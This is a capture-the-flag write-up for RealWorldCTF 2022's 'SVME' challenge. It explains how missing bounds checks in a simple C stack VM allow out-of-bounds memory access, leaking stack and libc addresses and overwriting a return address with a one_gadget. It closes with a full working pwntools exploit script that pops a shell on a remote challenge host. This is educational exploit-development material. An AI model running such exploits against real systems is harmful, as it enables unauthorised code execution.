# RealWorldCTF - SVME

**Solves:** 93

**Category:** Pwn/VM-Escape

**Description:** Professor Terence Parr has taught us [how to build a virtual machine](https://www.slideshare.net/parrt/how-to-build-a-virtual-machine). Now it's time to break it!

**CTF:** RealWorldCTF 2022

**Exploit Code**: 

[TOC]



-------------

# Step 1 - How to get the source Code

The first step to exploiting a Virtual Machine is obviously, if possible, obtaining the VM's implementation. For this challenge, we were provided with the [following tar archive](https://github.com/the-lightstack), which contains a `libc-2.31.so`, an `svme` binary (the file we are going to exploit) and a `docker` directory, which itself contains `main.c` ( the code that uses some `vm.h` we don't have) and a `Dockerfile`.  In the `Dockerfile` we find the following command to fetch the `vm.h` library: ```wget --no-check-certificate https://github.com/parrt/simple-virtual-machine-C/archive/refs/heads/master.zip -O svme.zip ```. I executed the wget command on my machine and started investigating `vm.h`, `vm.c` and `vmtest.c` in VScode.

# Step 2 - Finding the vulnerabilities



```c
while (opcode != HALT && ip < vm->code_size) {
        if (trace) vm_print_instr(vm->code, ip);
        ip++; //jump to next instruction or to operand
        switch (opcode) {
            case IADD:
                b = vm->stack[sp--];           // 2nd opnd at top of stack
                a = vm->stack[sp--];           // 1st opnd 1 below top
                vm->stack[++sp] = a + b;       // push result
                break;
            case ISUB:
                b = vm->stack[sp--];
                a = vm->stack[sp--];
                vm->stack[++sp] = a - b;
                break;
            ...
            case ICONST:
                vm->stack[++sp] = vm->code[ip++];  // push operand
                break;
            case LOAD: // load local or arg
                offset = vm->code[ip++];
                vm->stack[++sp] = vm->call_stack[callsp].locals[offset];
                break;
            case GLOAD: // load from global memory
                addr = vm->code[ip++];
                vm->stack[++sp] = vm->globals[addr];
                break;
            case STORE:
                offset = vm->code[ip++];
                vm->call_stack[callsp].locals[offset] = vm->stack[sp--];
                break;
            case GSTORE:
                addr = vm->code[ip++];
                vm->globals[addr] = vm->stack[sp--];
                break;
            case PRINT:
                printf("%d\n", vm->stack[sp--]);
                break;
            case POP:
                --sp;
                break;
           ...
            default:
                printf("invalid opcode: %d at ip=%d\n", opcode, (ip - 1));
                exit(1);
        }
```

I stripped the above code to (almost) only contain the opcodes that let us exploit the VM, which are `GLOAD`/`GSTORE` as well as `LOAD` /`STORE` (and `POP`, but we won't use that one for our exploit ). 

Do you find the Vulnerability in those functions?

Right! There is **no bound checking at all** for the indexes we may use! The size of the **locals** int array is 10, but we can access the 11. , 212. or -10. element of the array and therefore have an Out-Of-Bounds Read/Write (but limited, since we can only offset 32 bits from the base address of eg. the locals pointer, and with that we can't reach, for example, the stack)! 

# Step 3 - Setting up Exploit Dev Environment

 This step is optional, but I think it massively speeds up the process of investigating the behavior of your exploit. Instead of using the shipped `svme` binary, I decided to build it on my own using the same method the docker container uses: get the source code of the `vm` library and replace `vm_test.c` with the challenges `main.c` but then adding the following line to `CMakeLists.txt`: `set(CMAKE_BUILD_TYPE Debug)` . After that just run `cmake . && make` to build the binary.

This will add debug symbols to the binary, enabling you to do cool stuff like `p vm->code` in gdb (I use gdb with the [gef](https://github.com/hugsy/gef) extension ) and it didn't change any offsets in my case! 

Ok, with that out of the way let's get to the exploitation part!

# Step 4 - Developing the Exploit

Let's start this from the back: In the end we want to get a shell, so we will likely have to control the **Instruction Pointer**. If we have control over the IP, we can simply set it to the location of a **one_gadget** ( found with [the same-named tool ](https://github.com/david942j/one_gadget)). This means, we will also have to know the location of libc, to calculate the *actual* location of the **one_gadget**.

Let's start by looking into the VM-struct:

```C
typedef struct {
    int returnip;
    int locals[DEFAULT_NUM_LOCALS];
} Context;

typedef struct {
    int *code;
    int code_size;

    // global variable space
    int *globals;
    int nglobals;

    // Operand stack, grows upwards
    int stack[DEFAULT_STACK_SIZE];
    Context call_stack[DEFAULT_CALL_STACK_SIZE];
} VM;
```

*main.c* allocates this struct on  heap, therefore all fields **but** `*code`, which is a pointer provided by the user that points to the vm-code, and `*globals`, which is a pointer to another  location on the heap, are  continuously laid out on the heap, not pointers. Since this is the case and we have controls over `locals`, we can control all the fields of the VM struct, by using a large, negative index. Sadly, the vm struct doesn't own any function pointers we could easily overwrite, therefore we will have to overwrite the return address on the stack. But how do we know where the stack is? `*code` is placed on the stack, so if we leak it, we know exactly where the stack is located!

Let's do just that:

```
LOAD -996
LOAD -997
```

The `LOAD` instruction reads `locals[i]` onto the stack, and -996 is the amount of **ints** (not bytes) from `vm->call_stack[-1]->locals[0]` to `vm->code`. 

**Quick tip**

I first had struggles packing negative numbers to bytes before sending them to the VM, but the following lines of python do the trick:

`from struct import pack`

`b = pack("=i",<neg_number>)`

**Why two reads?**

Good question. The whole VM works with integers (so 32 bit), while the binary is for 64 bit machines (therefore also the address `*code` points to is 2 ints long)

**What can we do now, that we have the location of the stack?**

Leak addresses off of the stack! I know, that at `*code+0x218` a leak to an address inside `__libc_start_main` lies. But sadly, we can't reach that with an 32 bit offset from our `locals` address, so we will have to first write a primitive read/write gadget using the `vm->globals` pointer!

The following VM-Code describes who to do just that:

```
// Adding the offset from code addr -> libc leak
ICONST 0x218
IADD
// Writing that address to the globals pointer
STORE -993 ; lower 4 bytes
STORE -992 ; upper 4 bytes
// Leaking libc-addr
GLOAD 1
GLOAD 0
```

  The one-gadget I am going to use is located at `libc_base + 0xe6c81`, and our leak is *0x270b3* bytes after the beginning of the loaded libc. That's where the following calculations on the lower 4 bytes of the libc-leak come from:

```
// Leak to libc_base addr
ICONST 0x270b3
ISUB
// libc_base addr to one_gadget addr
ICONST 0xe6c81
IADD
```

Right now we have the address of our desired one-gadget on the stack and just got to redirect the code execution there. Luckily, the return address is always at `*code` leak - 40, so we can write our calculated one-gadget address there:

```
// Reloading code-pointer onto the stack
LOAD -996
LOAD -997
// Calculating address of return address on stack
ICONST 40
ISUB
// And then writing that to the global-pointer
STORE -993
STORE -992
// Finally writing one_gadget address onto ret-addr
GSTORE 0
GSTORE 1
// Escaping vm_exec function and triggering ret
HALT
```

And that is it, if you pack that into a python script, pad it to 128 ints and send it to the process, you should pop a shell! If you run the exploit code I have added below with the `REMOTE` argument (if the challenge is still up), you will get the following flag:

`rwctf{simple_vm_escape_helps_warming_up_your_real_world_hacking_skill}`

**Thanks for reading this writeup!** 

# The Exploit Code

My final exploit code can be seen below:

```python
#!/usr/bin/env python3
from pwn import *
from struct import pack

if args["REMOTE"]:
    p = remote("47.243.140.252",1337)
else:
    p = process("./svme")

o = {
    "NOOP"    : p32(0),
    "IADD"    : p32(1),   # int add
    "ISUB"    : p32(2),
    "IMUL"    : p32(3),
    "ILT"     : p32(4),   # int less than
    "IEQ"     : p32(5),   # int equal
    "BR"      : p32(6),   # branch
    "BRT"     : p32(7),   # branch if true
    "BRF"     : p32(8),   # branch if true
    "ICONST"  : p32(9),   # push constant integer
    "LOAD"    : p32(10),  # load from local context
    "GLOAD"   : p32(11),  # load from global memory
    "STORE"   : p32(12),  # store in local context
    "GSTORE"  : p32(13),  # store in global memory
    "PRINT"   : p32(14),  # print stack top
    "POP"     : p32(15),  # throw away top of stack
    "CALL"    : p32(16),  # call function at address with nargs,nlocals
    "RET"     : p32(17),  # return value from function
    "HALT"    : p32(18)
}

###################
#  Exploit Code   #
###################

code = b""

# Load stack-leak (code-pointer) onto fake-stack
code += o["LOAD"] 
code += pack("=i",-996)
code += o["LOAD"] 
code += pack("=i",-997)

# Add 0x218 to the lower-bytes part
code += o["ICONST"]
code += pack("=i",0x218) # 0x218 is the offset from code pointer to _start leak
code += o["IADD"]

code += o["STORE"]
code += pack("=i",-993)
code += o["STORE"]
code += pack("=i",-992)

# Actually reading the data now
code += o["GLOAD"]
code += p32(1)
code += o["GLOAD"]
code += p32(0)

# Calculating pos of one-gadget
code += o["ICONST"]
code += p32(0x270b3)
code += o["ISUB"]

code += o["ICONST"]
code += p32(0xe6c81)
code += o["IADD"]

# Loading code-pointer-values to stack (-40 = RET addr)
code += o["LOAD"] 
code += pack("=i",-996)
code += o["LOAD"] 
code += pack("=i",-997)

# Calculating location of ret
code += o["ICONST"]
code += pack("=i",40)
code += o["ISUB"]

 # Writing lower 4 bytes of ret-addr
code += o["STORE"]
code += pack("=i",-993)
code += o["STORE"]
code += pack("=i",-992)

# Writing one-gadget addr
code += o["GSTORE"]
code += p32(0)
code += o["GSTORE"]
code += p32(1)

# Ending program
code += o["HALT"]

code = code.ljust(128*4, b"\x00")
p.send(code)
p.sendline("id")
if args["REMOTE"]:
    p.sendline("cat /flag")

p.interactive()
```

